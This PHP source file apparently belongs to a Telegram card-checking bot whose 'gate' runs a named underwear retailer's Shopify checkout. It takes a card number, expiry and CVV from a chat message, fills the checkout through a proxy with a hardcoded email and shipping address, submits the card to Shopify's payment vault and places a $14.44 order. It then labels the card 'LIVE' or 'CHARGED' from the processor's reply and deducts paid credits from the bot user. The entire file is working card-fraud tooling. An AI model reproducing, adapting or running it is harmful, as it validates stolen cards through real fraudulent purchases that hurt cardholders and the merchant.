<?php
#require_once 'function.php';

$gate = 'bb';
$gateName = 'shopify + Braintree 14 usd';

sendMessage($chat_id, $chat_type, $message_id);
verificarGate($gate, $chat_id, $message_id);

$datosUsuario = userData($user_id, $username, $chat_id, $message_id);
$rango = $datosUsuario['rango'];
$creditos = $datosUsuario['creditos'];
$anti_spam = $datosUsuario['anti_spam'];
$plan = $datosUsuario['plan'];
$warns = $datosUsuario['warns'];
$last_message_time = $datosUsuario['last_message_time'];

if($warns > 2){
  sendMessage($chat_id,"<b>⚠ You have accumulated +2 warns,please contact the $owner.</b>");
  exit();
}

$date1 = date('Y-m-d H:i:s');
$diferencia = strtotime($date1) - strtotime($last_message_time);
$tiempo_restante = $anti_spam - $diferencia;

if ($tiempo_restante > 0) {
    sendMessage($chat_id, "Time remaining: $tiempo_restante seconds.", $message_id);
    exit();
}

if ($plan !== 'premium' && $chat_type === 'private') {
    sendMessage($chat_id, "<b>⚠ Error:</b> This command is only available for premium users.", $message_id);
    exit();
} elseif ($chat_type === 'supergroup') {
    $creditos = groupPlan($chat_id, $message_id);
}

if ($creditos <= 2) {
    sendMessage($chat_id, "<b>⚠ Error: You don't have enough credits.</b>", $message_id);
    exit();
}

$date1 = date('Y-m-d H:i:s');
$diferencia = strtotime($date1) - strtotime($last_message_time);
$tiempo_restante = $anti_spam - $diferencia;

if ($tiempo_restante > 0) {
    sendMessage($chat_id, "Tiempo restante: $tiempo_restante segundos.", $message_id);
    exit();
}

updateTime($user_id);

$lista = clean($message) ?: clean($r_message);
$exploded = multiexplode(array(":", "/", " ", "|", "::"), $lista);
$cc = $exploded[0];
$mes = $exploded[1];
$ano = $exploded[2];
$cvv = $exploded[3];

$mes = ltrim($mes, '0');
$ano = strlen($ano) == 2 ? '20' . $ano : $ano;

validateCreditCard($cc, $cvv, $mes, $ano, $gate, $gateName, $chat_id, $message_id);

/* BIN INFO[informacion del bin] */

$datoscc = "$cc|$mes|$ano|$cvv";
$ccbin = substr($cc, 0, 6);

$tiempo = microtime(true);
$mytime = 'time1';

$binData = getBinData($ccbin);

if($binData['level'] == 'prepaid'){
  sendMessage($chat_id, "<b>⚠ Error: bin prepaid locked.\nContact the owner $owner if you think it's a mistake.</b>", $message_id);
  exit();
}


$lod = "<em>
⚡ Please wait...
Cc: <code>$datoscc</code>
Country: {$binData['pais']} | {$binData['flag']}
Bank: {$binData['banco']}
━━━━━━━━━━━━━━
Elapsed time: {$mytime($tiempo)}s
</em>";

$m1 = sendMessage($chat_id, $lod, $message_id);
$m1 = $m1['result']['message_id'];


$cookieFile = 'galletas/cookie_' . uniqid() . '.txt';


$site = "www.danielalexanderunderwear.com";
$id_c = '31275122819';

#exit();


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://random-data-api.com/api/v2/users?size=2&is_xml=true');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$randomuser = curl_exec($ch);
curl_close($ch);
$firstnme = trim(strip_tags(getstr($randomuser, '"first_name":"', '"')));
$lastnme = trim(strip_tags(getstr($randomuser, '"last_name":"', '"')));

#--- 1_REQ

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'www.danielalexanderunderwear.com/cart/39275653300358:1?traffic_source=buy_now');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
$headers[] = 'Host: ' . $site . '';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
$r1 = curl_exec($ch);
$shit = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
curl_close($ch);

$checkouts = trim(strip_tags(getstr($r1, 'pageurl":"www.danielalexanderunderwear.com\/9065398335\/checkouts\/', '?')));
$token = trim(strip_tags(getstr($r1, 'name="authenticity_token" value="', '"')));


#---- 2 REQ----


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/9065398335/checkouts/' . $checkouts . '');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
$headers[] = 'authority: ' . $site . '';
$headers[] = 'method: POST';
$headers[] = 'path: /9065398335/checkouts/' . $checkouts . '';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://' . $site . '';
$headers[] = 'referer: https://' . $site . '/';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token=' . $token . '&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=veteranojuanca%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=dragon&checkout%5Bshipping_address%5D%5Blast_name%5D=vega&checkout%5Bshipping_address%5D%5Baddress1%5D=St.+Walter+Catholic+Church&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Roselle&checkout%5Bshipping_address%5D%5Bprovince%5D=IL&checkout%5Bshipping_address%5D%5Bzip%5D=60172&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=787&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$r2 = curl_exec($ch);
curl_close($ch);


$token2 = trim(strip_tags(getstr($r2, 'name="authenticity_token" value="', '"')));
$shipping = trim(strip_tags(getstr($r2, 'div class="radio-wrapper" data-shipping-method="', '">')));


#------- 3 REQ


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/9065398335/checkouts/' . $checkouts . '');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
$headers[] = 'authority: ' . $site . '';
$headers[] = 'method: POST';
$headers[] = 'path: /9065398335/checkouts/' . $checkouts . '';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://' . $site . '';
$headers[] = 'referer: https://' . $site . '/';
$headers[] = 'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token=' . $token2 . '&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-USPS%2520Standard-4.95&checkout%5Bclient_details%5D%5Bbrowser_width%5D=787&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$r3 = curl_exec($ch);
curl_close($ch);

$token3 = trim(strip_tags(getstr($r3, 'name="authenticity_token" value="', '"')));
$total = trim(strip_tags(getstr($r3, 'data-checkout-payment-due-target="', '"')));

#---- 4 REQ

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: es-PE,es-419;q=0.9,es;q=0.8,en;q=0.7,pt;q=0.6';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: deposit.us.shopifycs.com';
$headers[] = 'Origin: https://checkout.shopifycs.com';
$headers[] = 'Referer: https://checkout.shopifycs.com/';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"' . $cc . '","name":"' . $lastnme . ' ' . $firstnme . '","month":' . $mes . ',"year":' . $ano . ',"verification_value":"' . $cvv . '"},"payment_session_scope":"' . $site . '"}');
$r4 = curl_exec($ch);
curl_close($ch);
$sid = trim(strip_tags(getstr($r4, '{"id":"', '"}')));


$lod1 = "<em>
🟢 70% ... 
Cc: <code>$datoscc</code>
Country: {$binData['pais']} {$binData['flag']}
Bank: {$binData['banco']}
━━━━━━━━━━━━━━
Elapsed time: {$mytime($tiempo)}s
Estimated time [25-s]
</em>";

editMessage($chat_id, $lod1, $m1);


#------- 5 REQ

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/9065398335/checkouts/' . $checkouts . '');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
$headers[] = 'authority: ' . $site . '';
$headers[] = 'method: POST';
$headers[] = 'path: /9065398335/checkouts/' . $checkouts . '';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: es-PE,es;q=0.9';
$headers[] = 'cache-control: max-age=0';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://' . $site . '';
$headers[] = 'referer: https://' . $site . '/';
$headers[] = 'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token=' . $token3 . '&previous_step=payment_method&step=&s=' . $sid . '&checkout%5Bpayment_gateway%5D=22370058303&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=1444&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=806&checkout%5Bclient_details%5D%5Bbrowser_height%5D=641&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$r5 = curl_exec($ch);
sleep(5);
curl_close($ch);

#---- 6 REQ

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/9065398335/checkouts/' . $checkouts . '/processing?from_processing_page=1');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
$headers[] = 'Host: ' . $site . '';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Upgrade-Insecure-Requests: 1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
sleep(2);
$r6 = curl_exec($ch);
$shit2 = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
curl_close($ch);

if ($r6 === false) {
    $error = curl_error($ch);
    exit(edit_message($chat_id, "error en $error", $m1));
}

$msg = trim(strip_tags(getstr($r6, 'class="notice__content"><p class="notice__text">', '</p></div></div>')));


if (strpos($r6, '2010 Card Issuer Declined CVV')) {
    $status = "LIVE CCN ✅";
    $response = $msg;
    restarCreditos($chat_id);
} elseif (strpos($r6, '2001 Insufficient Funds')) {
    $status = "LIVE CVV ✅";
    $response = $msg;
    restarCreditos($chat_id);
} elseif (strpos($r6, 'Your order is confirmed') || strpos($r6, 'Thanks for supporting') || strpos($r6, '<div class="webform-confirmation">')) {
    $status = "CHARGED ⚡";
    $response = "card loaded successfully ✅";
    restarCreditos($chat_id);
} else {
    $status = "REPROVADA 🔴";
    $response = $msg;
}

$cmdr = "
<a href='https://t.me/rudeos_greyrat_chk'>𝐑𝐮𝐝𝐞𝐨𝐬_𝐂𝐡𝐤𝐁𝐨𝐭</a>
<em>                
[⁜] <b>card</b> ➳ <code>$datoscc</code>
[⁜] <b>status</b> ➳ $status
[⁜] <b>response</b> ➳ <code>$response</code>

[⁜] <b>search bin.</b> ➳ {$binData['pais']} | {$binData['flag']}
{$binData['banco']} - {$binData['level']} - {$binData['tipo']}

[⁜] <b>Time</b> ➳ {$mytime($tiempo)}s
[⁜] <b>gate</b> ➳ $gateName
[⁜] <b>User</b> ➳ @$username [<b>$rango</b>]
[⁜] <b>$owner</b>
</em>";

editMessage($chat_id, $cmdr, $m1);